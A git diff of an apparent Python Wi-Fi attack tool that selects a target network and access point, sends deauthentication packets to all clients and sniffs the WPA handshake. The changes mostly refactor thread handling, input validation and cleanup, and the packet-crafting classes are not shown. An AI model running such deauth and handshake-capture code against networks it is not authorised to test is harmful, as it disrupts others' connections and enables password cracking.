@@ -20,15 +20,14 @@ Dot11Type = Dot11FCS
 
 # Global used variables
 networks = []  # All found networks (essids)
-sniff_thread = None  # The thread used for sniffing APs
-deauth_thread = None  # The thread used for sending out deauth packages
+threads = set()  # All threads that are used should be addedd to this list
 selected_network = None  # The network to attack
 selected_ap = None  # The access point to attack
 
 
 # The main function that will run on program start
 def main():
-    global iface, selected_network, selected_ap, deauth_thread
+    global iface, selected_network, selected_ap, threads
 
     utilities.require_root()
 
@@ -41,6 +40,7 @@ def main():
     utilities.set_mon_mode(iface, "monitor")
 
     channel_hopper_thread = ChannelHopper(iface)
+    threads.add(channel_hopper_thread)
     channel_hopper_thread.start()
 
     selected_network = select_network()
@@ -55,7 +55,6 @@ def main():
     print("AP converted: ", utilities.convert_mac(selected_ap.bssid))
 
     sniff_handshake(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
-    # TODO Capture handshake
 
     channel_hopper_thread.stop = True
     channel_hopper_thread.join()
@@ -67,45 +66,53 @@ def main():
 
 # Process for having the user select which Network to attack
 def select_network():
-    global sniff_thread, networks, iface, Dot11Type
+    global threads, networks, iface, Dot11Type
 
     print("")
     print("Please specify the ID of the Network that you want to attack:")
     sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_networks=True)
+    threads.add(sniff_thread)
     sniff_thread.start()
-    network_id = int(input())
 
-    sniff_thread.shutdown = True
+    network_id = int(input())
+    if network_id < 0 or network_id >= len(networks):
+        print("Error: Invalid network selected.")
+        finalize()
+
+    sniff_thread.stop = True
     sniff_thread.join()
 
-    # TODO Check for wrong user input
     print("You selected Network ", network_id)
     return networks[network_id]
 
 
 # Process for having the user select which AP to attack
 def select_ap():
-    global sniff_thread, iface, networks, Dot11Type, selected_network
+    global threads, iface, networks, Dot11Type, selected_network
 
     print("")
     print("Please specify the ID of the AP that you want to attack:")
     for ap in selected_network.aps:
         print(ap)
     sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
+    threads.add(sniff_thread)
     sniff_thread.start()
-    ap_id = int(input())
 
-    sniff_thread.shutdown = True
+    ap_id = int(input())
+    if ap_id < 0 or ap_id >= len(selected_network.aps):
+        print("Error: Invalid access point selected.")
+        finalize()
+
+    sniff_thread.stop = True
     sniff_thread.join()
 
-    # TODO Check for wrong user input
     print("You selected AP ", ap_id)
     return selected_network.aps[ap_id]
 
 
 # Sends deauth attacks
 def deauth(target_network, target_client):
-    global iface, deauth_thread
+    global iface
 
     input("Press enter to start sending deauth")
     deauth_start(target_network, target_client)
@@ -114,14 +121,15 @@ def deauth(target_network, target_client):
 
 
 def deauth_start(target_network, target_client):
-    global deauth_thread
+    global threads, deauth_thread
 
     deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
+    threads.add(deauth_thread)
     deauth_thread.start()
 
 
 def deauth_stop():
-    global deauth_thread
+    global threads, deauth_thread
 
     deauth_thread.stop = True
     deauth_thread.join()
@@ -129,11 +137,12 @@ def deauth_stop():
 
 # Sniff a handshake
 def sniff_handshake(target_network, target_client):
-    global iface, selected_ap
+    global iface, selected_ap, threads
 
     input("Press enter to start sniffing a handshake")
     deauth_start(target_network, target_client)
     handshake_sniffer_thread = HandshakeSniffer(iface)
+    threads.add(handshake_sniffer_thread)
     handshake_sniffer_thread.start()
 
     time.sleep(3)
@@ -148,10 +157,23 @@ def catch_exceptions(signal, frame):
 
 # Clean up and shut down
 def finalize():
-    global iface
+    global iface, threads
 
-    utilities.print_networks_stats(networks)
+    # Stop all threads that are still running
+    alive_threads = [thread for thread in threads if thread.isAlive()]
+    for thread in alive_threads:
+        thread.stop = True
+    for thread in alive_threads:
+        if thread.isAlive():
+            thread.join()
+
+    # Put the network card back in managed mode
     utilities.set_mon_mode(iface, "managed")
+
+    # Print some stats
+    utilities.print_networks_stats(networks)
+
+    # Stop the program
     sys.exit(0)
 
 
